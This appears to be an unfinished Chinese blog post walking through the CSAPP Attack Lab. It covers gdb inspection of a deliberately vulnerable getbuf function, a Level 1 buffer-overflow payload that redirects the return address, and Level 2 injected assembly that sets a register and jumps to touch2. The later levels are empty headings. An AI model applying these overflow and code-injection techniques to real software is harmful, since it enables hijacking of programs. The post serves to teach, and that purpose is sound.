---
toc: true
layout: post
description: 记录在阅读和学习 CSAPP 过程中，完成 AttackLab 的相关内容
comments: true
categories: [operation system, c, csapp, assembly, attack, disassembly]
title: "CSAPP 之 Attack Lab"
image: images/csapp-attack/attack_preview.png
---

### 0x0 Introduction

在学习完汇编和系统安全相关的内容之后，为了更好的理解相关的内容，csapp 提供了一个配套的 lab，提供了两种方式的攻击，一种是直接写入 code，让程序在 return 时执行我们传入的另外一个函数地址；另外一种方式是通过组合代码中已有的片段，让代码按照我们想要的方式运行，最终被我们接管。

通过完成 attack lab，可以更好地理解 buffer overflow 相关的内容，同时也可以真正理解 code-injection 和 return-oriented 这两种攻击方式，最终可以更好地帮助我们写出安全漏洞更小的代码
。

在完成 lab 的同时，也可以让我们对 `gdb` 以及 `objdump` 等相关工具更熟练的掌握，对 stack frame 有深入的理解。

下面我们先介绍一下完成这个 lab 之前的一些工具准备工作，之后再分别介绍两种不同的攻击方式是如何实现的。

#### 0x0.1 Preparation

1. 第一个需要使用的工具是 `gcc`，需要用它来编译汇编代码，因为我们要在程序中插入自己的代码，所以需要用 `gcc` 将这段汇编代码编译，等待后续的使用；

   ```shell
   gcc -c test.s
   ```

2. 接着需要用到 `objdump`，这是用来将汇编代码转换成实际的机器码，因为需要传递给计算机执行，不能将汇编代码直接传进去，需要先通过 `gcc` + `objdump` 将汇编代码变成机器码；

    ```shell
    objdump -d test.o
    ```

3. 最后需要使用的是 lab 中提供的工具 `hex2raw`，因为程序需要的输入是字符串，但是我们工具的时候希望传入字节码，这个工具可以将我们期望传入程序的字节码转换成字符串；

    ```shell
    ./hex2raw < exploit.txt > exploit.bin
    ```

通过这三个工具我们就可以将需要执行的汇编代码转换成字节码，最终送到计算机中进行执行，这三个工具也给了我们做 code-injection 攻击的基础。

#### 0x0.2 Target Programs

这个 lab 中一共有两个 program 需要进行攻击，分别是 `CTARGET` 和 `RTARGET`，它们都是从 standard input 中读入 strings，主要是利用了下面 `getbuf` 这个函数

```c
unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

函数 `Gets` 和 `gets` 当 `BUFFER_SIZE` 足够大或者是 string 很小的时候是没有区别的，他们的行为就是将输入的 string 复制到目标位置，比如下面的例子

当输入比较短的字符串序列时，可以获得正常的结果。

```shell
unix> ./ctarget -q
Cookie: 0x59b997fa
Type string:Keep it short!
No exploit.  Getbuf returned 0x1
Normal return
```

当输入比较长的字符串序列时，会触发 segmentation fault。

```shell
unix> ./ctarget -q
Cookie: 0x59b997fa
Type string:This is not a very interesting string, but it has the property that
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:54 68 69 73 20 69 73 20 6E 6F 74 20 61 20 76 65 72 79 20 69 6E 74 65 72 65 73 74 69 6E 67 20 73 74 72 69 6E 67 2C 20 62 75 74 20 69 74 20 68 61 73 20 74 68 65 20 70 72 6F 70 65 72 74 79 20 74 68 61 74
```

我们的任务就是通过 `ctarget` 输入一个字符串来实现对这个程序的攻击，下面我们来具体针对每个 case 进行讲解。

### 0x1 Code Injection Attacks

对于前三个阶段，你需要把输入 string 存在 stack 中，如果 string 这包含一段可执行文件的字节编码，那么程序会将这个字符串看做可执行的代码，这样就实现了对代码的攻击。

#### 0x1.1 Level 1

这个阶段是一个热身环节，不需要插入可执行的代码，只需要在程序返回的时候，重定向到另外一个存在的 procedure 中就可以了。

首先通过 `objdump -d ctarget > ctarget.s` 可以将可执行程序反编译成汇编代码，而 `getbuf` 主要在下面的 `test` 函数中进行调用

```c
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

当 `getbuf` 执行结束之后，函数会返回到 `test` 中继续执行后面的语句，在这次攻击中，我们希望程序在执行完 `getbuf` 之后可以跳到 `touch1` 这种函数中，而不要继续在 `test` 中执行。

```c
void touch1() {
    vlevel = 1;         / * Part of validation protocol * /
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

首先可以在汇编中找到 `test` 和 `getbuf` 对应的位置代码如下

```js
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  ...
```

```js
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

在 `getbuf` 中，程序首先将栈顶 `%rsp` 减小 0x28=40 个字节，接着通过调用 `Gets` 获得用户输入的字符串，然后再将栈顶增加 40 个字节，最后通过 `retq` 退出这个函数的执行。

通过 `gdb` 进行执行，在 `getbuf` 这个函数开始时打上断点，然后进行运行，接着通过下面的命令查看分配的 buffer 大小

```js
(gdb) x/6gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
```

可以发现当程序执行完毕之后，增加栈顶，最终返回的地址是 `0x401976`，这正是 `test` 函数中调用 `getbuf` 之后一行的执行地址，所以我们只需要写入字符串，让字符串 overflow，将这个返回的地址变成我们希望他执行的函数 `touch1` 的地址 `0x4017c0` 即可。

所以输入的字符串如下

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 
```

其中前面 5 行，每行 8 个字节，一共 40 个字节填充了栈中的 buffer，接着填入 `c0 17 40` 替换之前的返回地址，这里要注意填入的顺序，返回地址是 `0x4017c0`，在填入 buffer 的时候，顺序是按地址从小到大依次填入每个字符，所以应该填入 `c0 17 40`，这样从地址中拿到的数据才是 `0x4017c0`。

接着可以通过 `gdb` 验证一下输入这样的 string 后 stack 中的内存变化

```js
(gdb) x/6gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000000000000      0x00000000004017c0
```

发现确实已经生效了，最后通过下面的方式验证 level1 攻击已经成功。

```shell
./hex2raw -i ctarget.1.txt| ./ctarget -q

Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
```

通过上面的信息提示可以看到，我们已经成功的调用了 `touch1`。

#### 0x1.2 Level 2

level2 攻击需要对输入的字符串插入一小段可执行的代码，除了要求程序返回的时候跳转到 `touch2` 这个函数，还需要 `val==cookie` 这个条件满足。

```c
void touch2(unsigned val) {
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
    }
    exit(0);
}
```

如果要执行到 `touch2`，那么和 level1 类似，只需要输入字符让其 overflow 栈中的内存，覆盖掉之前的返回地址即可。另外的一个需求是要对函数 `touch2` 的第一个参数修改为 `cookie` 这个值，需要插入一段汇编代码，但是如何让插入的这段汇编代码执行呢？

原理可以用下面的这幅图来表示

<div align='center'>
<img src='{{ site.baseurl }}/images/csapp-attack/attack_preview.png' width='500'>
</div>

相当于在 Q stack frame 中插入一段字符串，不过不要用 `touch1` 的地址去覆盖之前的返回地址，而是用 B 的地址去覆盖，这样程序在执行完 Q 之后就会跳到 B 的地址出继续执行，而 B 地址出的内存是我们通过 string 传入的内容，这样我们就可以传入一段可以执行的命令，在执行完之后，通过 `retq` 再跳转到 `touch2` 的执行地址。

前面通过 `gdb` 查看 `getbuf` 中的内存，发现栈顶的地址是 `0x0x5561dc78`，所以我们可以把需要执行的代码段在最前面写入，然后把这个地址放到 `0x4017c0` 的位置就可以插入我们要执行的代码。

```js
(gdb) b*0x4017ac
(gdb) r -q
(gdb) x/6gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000000000000      0x00000000004017c0
```

下面来看一下我们需要执行的代码应该怎么写，这里需要就 `val` 设置成 `cookie` 的值，可以简单地将 level1 中 `touch1` 的地址修改为 `touch2` 即执行到 `touch2` 中，然后通过 `x 0x6044e4` 发现 `cookie` 的值为 `0x59b997fa`，所以只需要把 `%rdi` 设置成 `cookie` 值即可，要写入的代码如下

```js
pushq $0x4017ec
movq $0x59b997fa,%rdi
ret
```

#### 0x1.3 Level 3

### 0x2 Return-Oriented Programming

#### 0x2.1 Level 4

#### 0x2.2 Level 5

### 0x3 Conclusion

### 0x4 Reference
